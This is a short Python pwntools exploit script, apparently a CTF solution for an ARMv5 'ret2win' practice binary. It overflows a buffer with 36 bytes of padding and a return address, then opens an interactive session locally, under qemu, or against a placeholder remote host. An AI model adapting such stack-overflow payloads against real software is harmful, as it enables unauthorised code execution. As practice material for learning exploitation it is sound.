#!/usr/bin/env python3

# Exploit by x90slide

from pwn import *

elf = ELF("./ret2win_armv5_patched")

gs = '''
init-pwndbg
continue
'''

context.binary = elf
#context.log_level = "debug"

def conn():
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    elif args.LOCAL:
        return process(["qemu-arm-static", "-L", "/usr/arm-linux-gnueabi", elf.path])
    else:
        return remote("addr", 1337)

io = conn()

def main():

    # good luck pwning :)

    #gdb.attach(io, gdbscript=gs)

    #with open("exploit", "w") as f:
    #    f.write(payload)

    payload = flat(b'A'*36, 0x000105ec)
    io.sendlineafter(b'>', payload)

    io.interactive()

if __name__ == "__main__":
    main()
